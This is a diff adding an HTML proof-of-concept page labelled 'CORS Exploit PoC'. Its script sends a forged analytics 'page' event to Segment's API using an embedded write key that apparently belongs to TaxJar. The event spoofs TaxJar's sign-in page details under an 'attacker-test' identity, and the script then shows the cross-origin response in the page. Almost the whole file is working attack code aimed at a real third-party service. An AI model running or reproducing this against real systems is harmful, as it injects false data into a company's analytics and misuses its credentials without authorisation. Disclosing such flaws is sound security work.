@@ -1,0 +1,49 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>CORS Exploit Demo</title>
+</head>
+<body>
+  <h2>🔥 CORS Exploit PoC</h2>
+  <script>
+    fetch("https://api.segment.io/v1/p", {
+      method: "POST",
+      headers: {
+        "Content-Type": "text/plain"
+      },
+      body: JSON.stringify({
+        timestamp: new Date().toISOString(),
+        type: "page",
+        properties: {
+          path: "/sign_in",
+          referrer: "https://app.taxjar.com/",
+          title: "Log in to TaxJar - TaxJar",
+          url: "https://app.taxjar.com/sign_in"
+        },
+        context: {
+          page: {
+            path: "/sign_in",
+            referrer: "https://app.taxjar.com/",
+            title: "Log in to TaxJar - TaxJar",
+            url: "https://app.taxjar.com/sign_in"
+          },
+          userAgent: navigator.userAgent,
+          library: { name: "exploit-js", version: "1.0.0" }
+        },
+        messageId: "demo-" + Math.random().toString(36).substring(2),
+        anonymousId: "attacker-test",
+        writeKey: "jPW0Udoiicg5iccClHsBoWgjNoBdwd8N"
+      })
+    })
+    .then(res => res.text())
+    .then(data => {
+      console.log("✅ CORS success! Response:", data);
+      document.body.innerHTML += `<pre>${data}</pre>`;
+    })
+    .catch(err => {
+      console.error("❌ CORS failed:", err);
+      document.body.innerHTML += `<pre>${err}</pre>`;
+    });
+  </script>
+</body>
+</html>
